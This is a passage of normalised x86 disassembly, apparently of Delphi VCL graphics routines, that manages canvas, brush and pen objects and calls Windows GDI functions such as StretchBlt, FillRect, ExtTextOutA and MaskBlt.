mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c940
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41c958
sub_41cae8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b7ec
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41cb28
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b8d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41cb50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413ebc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41cbe0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c048
xor eax eax
push ebp
push sub_41cbc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbca
mov eax [ ebp - 0x8 ]
call sub_41c058
retn
sub_41cbf8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41cc14
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41cc59
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b980
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc60
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41cc64
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41cc14
add esp 0x10
pop edi
pop esi
retn
sub_41cc90
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cbf8
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41cc14
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41ccc4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b7d4
xor edx edx
push ebp
push sub_41cd91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b7e0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bfbc
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41cdac
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cbf8
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41cc14
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41cde0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d778
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c81c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d798
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cae8
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d7b8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413bfc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41cea4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413c98
xor edx edx
mov eax esi
call sub_41d5b0
mov eax [ esi + 0xc ]
call sub_403224
mov eax [ esi + 0x10 ]
call sub_403224
mov eax [ esi + 0x14 ]
call sub_403224
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e90
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41cf00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d604
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41cf88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax [ ebx + 0x14 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4124e4
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d034
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax [ ebx + 0x14 ]
call sub_41ccc4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d070
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax [ ebx + 0x14 ]
call sub_41ccc4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d0ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d10c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d138
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d170
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d1b8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d1f4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d530
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d220
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax ebx
call sub_41d1f4
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40421c
push eax
mov eax esi
call sub_40441c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41d390
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d10c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41d390
inc eax
add edi eax
sub_41d2ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_41cda4
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_40421c
push eax
mov eax esi
call sub_40441c
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_41d1f4
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_41d390
inc eax
add [ ebp - 0x4 ] eax
sub_41d34c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40421c
push eax
mov eax edi
call sub_40441c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d390
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d34c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d3ac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d34c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d3cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d418
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d41f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d0e4
sub_41d478
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d49c
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d10c
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d4bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d4e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d604
mov eax [ ebp + 0x8 ]
call sub_41bfbc
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d550
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d5b0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d550
mov edx esp
mov eax ebx
call sub_41d478
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d49c
sub_41d604
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d6a0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
test bl 0x8
je r-xdata
mov eax esi
call sub_41d6cc
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d6fc
sub_41d6a0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c4d8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d6cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41c9d8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d6fc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41ccc4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41ccc4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41cda4
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41cc88
call sub_41bfbc
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41d820
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41d86a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d871
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_41d874
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41d910
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d820
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041cc
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d917
lea eax [ ebp - 0x104 ]
call sub_403f5c
retn
sub_41d92c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41da7a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41d9e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41d874
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41d874
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da81
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41da8c
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41dac0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41dd40
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d91c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd47
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d91c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41db93
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_40686c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
